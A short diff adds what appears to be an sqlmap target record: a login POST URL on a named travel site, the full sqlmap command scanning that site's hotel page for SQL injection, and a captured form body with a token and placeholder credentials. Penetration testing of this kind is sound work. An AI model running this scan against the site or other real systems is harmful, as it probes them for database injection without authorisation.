@@ -1,0 +1,3 @@
+https://pruebas.travelamedida.com/login (POST)  # /opt/sqlmap/sqlmap.py -u https://pruebas.travelamedida.com/hoteles --forms --batch --level=1 --risk=1 --technique=BEU --output-dir=sqlmap/hoteles-out
+
+_token=QnTuy5H3ZwWVTebqd880planuD4VjH1DxQIg2ZOS&email=JvGl&password=ePMR&remember=on
